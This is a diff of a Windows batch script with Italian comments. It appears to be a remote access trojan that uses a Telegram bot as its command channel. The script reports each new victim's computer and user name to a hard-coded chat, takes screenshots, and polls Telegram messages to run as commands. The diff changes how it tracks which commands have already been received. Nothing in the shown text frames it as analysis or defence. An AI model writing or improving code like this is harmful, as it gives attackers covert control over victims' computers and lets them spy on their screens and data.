@@ -14,13 +14,9 @@ set "CHAT_ID=5709299213"
 set "SCREENSHOT_PATH=%TEMP%\%RANDOM%.png"
 set "URL_FILE=%TEMP%\last_url.txt"
 set "PROCESSED_URLS=%TEMP%\processed_urls.txt"
+set "LAST_COMMAND_ID=0"
 
-:: Invia notifica di connessione e ottieni l'ultimo update_id
-for /f "tokens=*" %%A in ('curl -s -X GET "https://api.telegram.org/bot%BOT_TOKEN%/getUpdates" ^| powershell -command "$json=ConvertFrom-Json ($input); if($json.ok -and $json.result) { $json.result[-1].update_id } else { 0 }"') do (
-    set "LAST_COMMAND_ID=%%A"
-)
-
-:: Notifica connessione
+:: Invia notifica di connessione
 curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
     -d "chat_id=%CHAT_ID%" ^
     -d "text=🟢 Nuova connessione da: %COMPUTERNAME% (%USERNAME%)"
@@ -46,11 +42,11 @@ if not exist "%PROCESSED_URLS%" (
 
 :: Loop principale
 :command_loop
-:: Controlla SOLO nuovi messaggi
+:: Controlla nuovi messaggi
 curl -s -X GET "https://api.telegram.org/bot%BOT_TOKEN%/getUpdates?offset=%LAST_COMMAND_ID%" > "%TEMP%\updates.json"
 
 :: Estrai comandi dai messaggi
-for /f "tokens=*" %%A in ('powershell -command "$json=Get-Content '%TEMP%\updates.json'|ConvertFrom-Json;if($json.ok -and $json.result){$json.result|ForEach-Object{if($_.update_id -gt %LAST_COMMAND_ID%){$LAST_COMMAND_ID=$_.update_id; if($_.message.text){Write-Output ($_.update_id.ToString()+':'+$_.message.text)}}}}"') do (
+for /f "tokens=*" %%A in ('powershell -command "$json=Get-Content '%TEMP%\updates.json'|ConvertFrom-Json;if($json.ok){$json.result|ForEach-Object{if($_.message.text -and $_.update_id -gt %LAST_COMMAND_ID%){Write-Output ($_.update_id.ToString()+':'+$_.message.text)}}}"') do (
     set "update_data=%%A"
     set "LAST_COMMAND_ID=!update_data:*:=!"
     set "command=!update_data:*:=!"
